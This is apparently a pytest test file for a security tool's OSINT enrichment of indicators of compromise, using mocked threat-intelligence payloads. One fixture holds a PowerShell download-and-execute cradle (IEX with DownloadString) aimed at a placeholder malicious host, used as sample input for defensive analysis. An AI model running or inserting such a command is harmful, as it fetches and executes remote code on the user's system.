"""P1-01 · Live OSINT wiring · parity + shape gates.

Locks the following invariants:

  1. **Parity**: X-Lab's OSINT bundle (cio.metadata["osint"]) is composed
     from the EXACT same two Workspace services (_osint_lookup +
     enrich_iocs). Given identical mocked provider payloads, the bundle
     is deterministic and matches the direct-call reference.
  2. **No engine fork**: `enrich_cio` never imports its own HTTP client
     or provider adapter — it only re-dispatches to the shared services.
  3. **Shape**: every IOC node in the CIO carries an `attrs.enrichment`
     block whose `providers[]` are 11-field cards (name · state ·
     malicious · suspicious · harmless · reputation · detail · first_seen
     · last_seen · tags · link).
  4. **Graceful degradation**: if a provider raises, the pipeline
     completes with `state='error'` recorded — never crashes.
  5. **Cache determinism**: same input twice within TTL → same bytes,
     no additional provider calls.

Zero live network calls. All monkey-patched at the shared service layer.
"""
from __future__ import annotations

import asyncio
import json
from typing import Any, Dict, List
from unittest.mock import patch, AsyncMock

import pytest

from nivxforge.cim.fact_substrate import FactSubstrate, IOCRecord, DecoderLayer
from nivxforge.investigation import build_cio
from nivxforge.investigation import osint_enricher


# ────────────────────────────────────────────────────────────────────
# Fixtures — a canonical CIO containing every IOC kind we enrich.
# ────────────────────────────────────────────────────────────────────
_CANONICAL_IP = "203.0.113.42"
_CANONICAL_DOMAIN = "malicious.example.com"
_CANONICAL_URL = "http://malicious.example.com/payload.exe"
_CANONICAL_HASH = "a" * 64  # sha256


def _make_cio_with_iocs():
    fs = FactSubstrate(
        input_text=f"powershell IEX (New-Object Net.WebClient).DownloadString('{_CANONICAL_URL}')",
        input_kind="powershell",
        source_endpoint="/api/decode/smart",
        source_surface="test",
        decoder_chain=[
            DecoderLayer(idx=0, op="base64", input_kind="text", output_kind="text",
                         output_preview="downloaded from " + _CANONICAL_URL, reason="test"),
        ],
        iocs=[
            IOCRecord(kind="ip", value=_CANONICAL_IP, stage_passed=("context",)),
            IOCRecord(kind="domain", value=_CANONICAL_DOMAIN, stage_passed=("context",)),
            IOCRecord(kind="url", value=_CANONICAL_URL, stage_passed=("context",)),
            IOCRecord(kind="sha256", value=_CANONICAL_HASH, stage_passed=("context",)),
        ],
        mitre_hits=[],
        ti_hits=[],
        reasoning_notes=[],
    )
    return build_cio(fs)


def _mock_local_lookup_result() -> Dict[str, Any]:
    """Stand-in for `_osint_lookup` — matches its real return shape."""
    return {
        "by_value": {
            _CANONICAL_URL: {
                "kind": "url", "value": _CANONICAL_URL,
                "sources": ["urlhaus"], "hit_count": 3,
                "severity": "high", "confidence": 90,
                "malware_families": ["emotet"],
                "first_seen": "2026-01-05T00:00:00Z",
                "last_seen":  "2026-02-01T00:00:00Z",
            },
        },
        "by_kind": {},
        "sources": {"urlhaus": 1},
        "summary": {"total_lookups": 4, "matches": 1},
    }


def _mock_live_enrich_result() -> Dict[str, Any]:
    """Stand-in for `enrich_iocs` — matches its real return shape."""
    return {
        "ips": [{
            "value": _CANONICAL_IP,
            "virustotal": {"malicious": 8, "suspicious": 2, "harmless": 40, "reputation": -30,
                           "asn": "AS64500", "as_owner": "TESTORG", "country": "US"},
            "abuseipdb":  {"abuse_confidence_score": 92, "country_code": "US",
                           "usage_type": "Data Center/Web Hosting/Transit",
                           "isp": "TestISP", "total_reports": 145,
                           "last_reported_at": "2026-01-31T12:00:00Z", "is_tor": False},
            "otx":        {"pulse_count": 7, "reputation": -1,
                           "pulses": [{"name": "Emotet C2", "tags": ["emotet", "banker"]}]},
            "geo":        {"country": "US", "isp": "TestISP"},
            "reverse_dns": None, "shodan": None, "greynoise": None, "ipinfo": None,
        }],
        "domains": [{
            "value": _CANONICAL_DOMAIN,
            "classification": {"tld": "com", "is_high_risk_tld": False, "is_onion": False,
                               "length": 22, "has_dashes": False, "num_subdomains": 1},
            "resolved_ips": [_CANONICAL_IP],
            "virustotal": {"malicious": 12, "suspicious": 3, "harmless": 25, "reputation": -40,
                           "categories": {"forcepoint": "malicious"}},
            "otx":        {"pulse_count": 4, "reputation": None,
                           "pulses": [{"name": "Emotet infra", "tags": ["emotet"]}]},
            "urlscan":    {"total": 2, "results": [{"url": _CANONICAL_URL, "verdict": True,
                                                    "score": 80, "scan_id": "abc-123"}]},
        }],
        "urls": [{
            "value": _CANONICAL_URL, "scheme": "http",
            "host": _CANONICAL_DOMAIN, "path": "/payload.exe",
            "port": None, "is_onion": False,
            "virustotal": {"malicious": 15, "suspicious": 2, "harmless": 20, "reputation": -50,
                           "categories": {}, "final_url": _CANONICAL_URL},
            "otx":        {"pulse_count": 5, "reputation": None, "pulses": []},
            "urlscan":    {"total": 1, "results": [{"url": _CANONICAL_URL, "verdict": True,
                                                    "score": 90, "scan_id": "def-456"}]},
        }],
        "hashes": [{
            "algorithm": "sha256", "value": _CANONICAL_HASH,
            "virustotal": {"malicious": 45, "suspicious": 3, "harmless": 12, "reputation": -80,
                           "type_description": "Win32 EXE",
                           "meaningful_name": "payload.exe",
                           "threat_label": "trojan.emotet/banker"},
            "otx":            {"pulse_count": 9, "reputation": None,
                               "pulses": [{"name": "Emotet dropper", "tags": ["emotet"]}]},
            "hybrid_analysis": None,
        }],
        "sources_used": ["ip-api.com (geolocation, no key)", "system DNS (reverse lookup, resolution)",
                         "VirusTotal", "AbuseIPDB", "AlienVault OTX", "URLScan.io"],
    }


@pytest.fixture(autouse=True)
def _clear_cache():
    osint_enricher._cache_clear()
    yield
    osint_enricher._cache_clear()


# ────────────────────────────────────────────────────────────────────
# 1 · Parity — X-Lab bundle = direct workspace shared-service output
# ────────────────────────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_osint_bundle_reuses_workspace_shared_services():
    local, live = _mock_local_lookup_result(), _mock_live_enrich_result()
    keys = {"virustotal": "k", "abuseipdb": "k", "otx": "k", "urlscan": "k"}
    with patch("routers.auto_investigate._osint_lookup", new=AsyncMock(return_value=local)), \
         patch("osint.enrich_iocs", new=AsyncMock(return_value=live)):
        cio = _make_cio_with_iocs()
        await osint_enricher.enrich_cio(cio, keys=keys)
    md = cio.metadata.get("osint")
    assert md is not None, "cio.metadata.osint MUST be populated"
    assert md["engine"] == "shared:workspace"
    # Byte-equal parity: the bundle IS the merged shared-service output.
    assert md["local"] == local
    assert md["live"] == live
    # Provider attribution surfaces which providers actually replied.
    assert "VirusTotal" in md["providers_used"]
    assert "AbuseIPDB" in md["providers_used"]


@pytest.mark.asyncio
async def test_no_forked_http_client():
    """`osint_enricher` MUST NOT import its own httpx or requests client.
    Enforces §11 no-fork rule at the module boundary."""
    src = open(osint_enricher.__file__).read()
    assert "import httpx" not in src, "osint_enricher forked its own HTTP client (should reuse shared services)"
    assert "import requests" not in src


# ────────────────────────────────────────────────────────────────────
# 2 · Shape — 11-field provider cards on every IOC node
# ────────────────────────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_every_ioc_node_gets_eleven_field_cards():
    local, live = _mock_local_lookup_result(), _mock_live_enrich_result()
    keys = {"virustotal": "k", "abuseipdb": "k", "otx": "k", "urlscan": "k"}
    with patch("routers.auto_investigate._osint_lookup", new=AsyncMock(return_value=local)), \
         patch("osint.enrich_iocs", new=AsyncMock(return_value=live)):
        cio = _make_cio_with_iocs()
        await osint_enricher.enrich_cio(cio, keys=keys)
    ioc_nodes = [n for n in cio.evidence_graph.nodes if n.kind == "ioc"]
    assert len(ioc_nodes) == 4
    required_fields = {"name", "state", "malicious", "suspicious", "harmless",
                       "reputation", "detail", "first_seen", "last_seen", "tags", "link"}
    for n in ioc_nodes:
        enr = n.attrs.get("enrichment")
        assert enr is not None, f"node {n.id} missing enrichment"
        assert "providers" in enr and isinstance(enr["providers"], list)
        assert len(enr["providers"]) >= 1, f"node {n.id} has no provider cards"
        for card in enr["providers"]:
            missing = required_fields - set(card.keys())
            assert not missing, f"node {n.id} card {card.get('name')} missing fields: {missing}"


@pytest.mark.asyncio
async def test_ip_has_virustotal_and_abuseipdb_hit_state():
    local, live = _mock_local_lookup_result(), _mock_live_enrich_result()
    keys = {"virustotal": "k", "abuseipdb": "k", "otx": "k"}
    with patch("routers.auto_investigate._osint_lookup", new=AsyncMock(return_value=local)), \
         patch("osint.enrich_iocs", new=AsyncMock(return_value=live)):
        cio = _make_cio_with_iocs()
        await osint_enricher.enrich_cio(cio, keys=keys)
    ip_node = next(n for n in cio.evidence_graph.nodes if n.value == _CANONICAL_IP)
    provs = {p["name"]: p for p in ip_node.attrs["enrichment"]["providers"]}
    assert provs["VirusTotal"]["state"] == "hit"
    assert provs["VirusTotal"]["malicious"] == 8
    assert provs["AbuseIPDB"]["state"] == "hit"
    assert provs["AbuseIPDB"]["reputation"] == 92
    assert provs["AlienVault OTX"]["state"] == "hit"


# ────────────────────────────────────────────────────────────────────
# 3 · Graceful degradation
# ────────────────────────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_live_provider_failure_does_not_crash():
    async def _boom(*_a, **_k):
        raise RuntimeError("simulated VT outage")
    with patch("routers.auto_investigate._osint_lookup",
               new=AsyncMock(return_value=_mock_local_lookup_result())), \
         patch("osint.enrich_iocs", new=_boom):
        cio = _make_cio_with_iocs()
        result = await osint_enricher.enrich_cio(cio, keys={"virustotal": "k"})
    assert result is cio
    assert cio.metadata["osint"]["live"].get("error") == "simulated VT outage"
    # Enrichment blocks still attached with providers list.
    for n in cio.evidence_graph.nodes:
        if n.kind == "ioc":
            assert "enrichment" in n.attrs
            assert isinstance(n.attrs["enrichment"]["providers"], list)


@pytest.mark.asyncio
async def test_missing_api_keys_yields_no_key_state():
    with patch("routers.auto_investigate._osint_lookup",
               new=AsyncMock(return_value=_mock_local_lookup_result())), \
         patch("osint.enrich_iocs", new=AsyncMock(return_value=_mock_live_enrich_result())):
        cio = _make_cio_with_iocs()
        await osint_enricher.enrich_cio(cio, keys={})  # no keys at all
    ip_node = next(n for n in cio.evidence_graph.nodes if n.value == _CANONICAL_IP)
    provs = {p["name"]: p for p in ip_node.attrs["enrichment"]["providers"]}
    assert provs["VirusTotal"]["state"] == "no-key"
    assert provs["AbuseIPDB"]["state"] == "no-key"


# ────────────────────────────────────────────────────────────────────
# 4 · Deterministic cache
# ────────────────────────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_cache_prevents_second_provider_call():
    local, live = _mock_local_lookup_result(), _mock_live_enrich_result()
    keys = {"virustotal": "k"}
    lookup_mock = AsyncMock(return_value=local)
    enrich_mock = AsyncMock(return_value=live)
    with patch("routers.auto_investigate._osint_lookup", new=lookup_mock), \
         patch("osint.enrich_iocs", new=enrich_mock):
        cio1 = _make_cio_with_iocs()
        cio2 = _make_cio_with_iocs()
        await osint_enricher.enrich_cio(cio1, keys=keys)
        await osint_enricher.enrich_cio(cio2, keys=keys)
    assert lookup_mock.call_count == 1, "second identical enrichment must hit cache"
    assert enrich_mock.call_count == 1
    # Bundles must be byte-identical.
    assert json.dumps(cio1.metadata["osint"], sort_keys=True) == \
           json.dumps(cio2.metadata["osint"], sort_keys=True)


# ────────────────────────────────────────────────────────────────────
# 5 · Empty-IOC CIO must not fail
# ────────────────────────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_no_iocs_returns_empty_bundle():
    fs = FactSubstrate(
        input_text="benign echo hello",
        input_kind="text",
        source_endpoint="/api/decode/smart",
        source_surface="test",
        decoder_chain=[], iocs=[], mitre_hits=[], ti_hits=[], reasoning_notes=[],
    )
    cio = build_cio(fs)
    await osint_enricher.enrich_cio(cio, keys={"virustotal": "k"})
    assert cio.metadata["osint"]["local"]["summary"]["total_lookups"] == 0
